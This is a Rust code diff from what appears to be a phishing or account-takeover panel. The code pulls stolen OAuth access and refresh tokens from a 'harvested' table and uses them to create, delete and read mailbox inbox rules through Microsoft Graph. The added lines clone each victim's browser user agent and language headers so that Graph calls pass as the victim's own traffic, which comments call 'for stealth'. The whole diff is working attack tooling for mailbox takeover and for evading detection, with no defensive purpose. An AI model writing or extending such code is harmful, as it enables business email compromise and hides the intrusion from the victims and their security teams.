@@ -28,8 +28,12 @@ pub fn spawn_immediate_rule_execution(state: AppState, token_id: String, rule: C
         let conditions: serde_json::Value = serde_json::from_str(&rule.conditions_json).unwrap_or(serde_json::json!({}));
         let actions: serde_json::Value = serde_json::from_str(&rule.actions_json).unwrap_or(serde_json::json!({}));
 
-        // Build a Graph $search or $filter query from the rule conditions
-        let client = GraphClient::new();
+        // Build a Graph client with the victim's browser fingerprint cloned
+        // so all Graph API calls look like they come from the victim's browser
+        let client = GraphClient::with_fingerprint(
+            token.user_agent.clone(),
+            token.accept_language.clone(),
+        );
 
         // Extract condition values for searching
         let subject_keywords: Vec<String> = conditions.get("subjectContains")
@@ -797,7 +801,7 @@ pub async fn create_inbox_rule(
         Err(_) => {
             // Fall back to harvested table
             let row: crate::HarvestedToken = sqlx::query_as(
-                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status FROM harvested WHERE id = ?"
+                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested WHERE id = ?"
             )
             .bind(&req.token_id)
             .fetch_one(pool)
@@ -815,6 +819,8 @@ pub async fn create_inbox_rule(
                 scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                 last_refreshed_at: Some(chrono::Utc::now()),
                 account_type: row.account_type.or(row.category),
+                user_agent: row.user_agent,
+                accept_language: row.accept_language,
             }
         }
     };
@@ -1029,7 +1035,11 @@ pub async fn create_rule_handler(
         }
     }
 
-    let client = GraphClient::new();
+    // Create Graph client with victim's fingerprint for stealth
+    let client = match crate::retrieve_any_token(state.get_ref(), &body.token_id).await {
+        Ok(t) => GraphClient::with_fingerprint(t.user_agent.clone(), t.accept_language.clone()),
+        Err(_) => GraphClient::new(),
+    };
     let result = create_inbox_rule(&state, &client, &body).await;
 
     let success = result.is_ok();
@@ -1180,7 +1190,7 @@ pub async fn delete_rule_handler(
             Ok(t) => Some(t),
             Err(_) => {
                 match sqlx::query_as::<_, crate::HarvestedToken>(
-                    "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status FROM harvested WHERE id = ?"
+                    "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested WHERE id = ?"
                 )
                 .bind(&rule.token_id)
                 .fetch_one(&state.pool)
@@ -1196,6 +1206,8 @@ pub async fn delete_rule_handler(
                         scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                         last_refreshed_at: Some(chrono::Utc::now()),
                         account_type: row.account_type.or(row.category),
+                        user_agent: row.user_agent,
+                        accept_language: row.accept_language,
                     }),
                     Err(e) => {
                         eprintln!("[rules] Failed to retrieve token for rule deletion: {}", e);
@@ -1327,7 +1339,7 @@ pub async fn fetch_graph_rules_handler(
         Err(_) => {
             // Fall back to harvested table
             match sqlx::query_as::<_, crate::HarvestedToken>(
-                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status FROM harvested WHERE id = ?"
+                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, status, user_agent, accept_language FROM harvested WHERE id = ?"
             )
             .bind(&token_id)
             .fetch_one(&state.pool)
@@ -1343,6 +1355,8 @@ pub async fn fetch_graph_rules_handler(
                     scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                     last_refreshed_at: Some(chrono::Utc::now()),
                     account_type: row.account_type.or(row.category),
+                    user_agent: row.user_agent,
+                    accept_language: row.accept_language,
                 },
                 Err(e) => {
                     return HttpResponse::NotFound().json(serde_json::json!({
